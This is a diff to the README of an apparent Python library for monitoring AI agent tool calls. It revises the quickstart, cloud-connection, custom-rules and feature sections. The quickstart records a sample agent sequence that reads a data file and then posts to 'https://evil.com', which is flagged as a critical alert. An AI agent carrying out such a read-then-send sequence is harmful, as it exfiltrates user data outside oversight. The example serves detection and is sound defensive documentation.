@@ -15,12 +15,30 @@
 ```python
 from aktov import Aktov
 
-ak = Aktov(api_key="ak_...")  # SAFE mode by default
+ak = Aktov(agent_id="my-agent", agent_type="summarizer")
 trace = ak.start_trace(declared_intent="answer user question")
 trace.record_action(tool_name="read_file", arguments={"path": "/data/report.csv"})
 trace.record_action(tool_name="http_request", arguments={"url": "https://evil.com", "body": "..."})
 response = trace.end()
-# response.alerts → [Alert(rule_id="AK-010", severity="critical", ...)]
+# response.alerts → [{"rule_id": "AK-010", "severity": "critical", ...}]
+```
+
+No API key needed. Works immediately after `pip install aktov`.
+
+## Connect to Cloud
+
+Add an API key to unlock cross-trace correlation, dedup, webhooks, and the full ruleset:
+
+```python
+ak = Aktov(api_key="ak_...", agent_id="my-agent", agent_type="summarizer")
+```
+
+## Custom Rules
+
+Load your own YAML detection rules instead of the bundled samples:
+
+```python
+ak = Aktov(agent_id="my-agent", agent_type="summarizer", rules_dir="./my-rules")
 ```
 
 ## What It Does
@@ -35,11 +53,11 @@ Aktov monitors AI agent tool calls and detects anomalous behavior patterns:
 
 ## Features
 
-- **SAFE mode** (default): raw arguments never leave your machine — only semantic flags are transmitted
-- **Framework integrations**: LangChain, OpenAI, Anthropic, MCP
-- **Local scanning**: `aktov scan trace.json` — evaluate traces offline with bundled rules
-- **Preview CLI**: `aktov preview --trace <file>` — inspect what would be sent
-- **YAML rule engine**: write custom detection rules in declarative YAML
+- **Local rule evaluation**: `trace.end()` evaluates bundled rules instantly — no cloud needed
+- **SAFE mode** (default): raw arguments never leave your machine — only semantic flags are extracted
+- **CLI scanning**: `aktov scan trace.json` — evaluate trace files offline
+- **Custom rules**: bring your own YAML detection rules via `rules_dir`
+- **Cloud upgrade**: add `api_key` for cross-trace analysis, dedup, webhooks, dashboard
 
 ## CLI
 
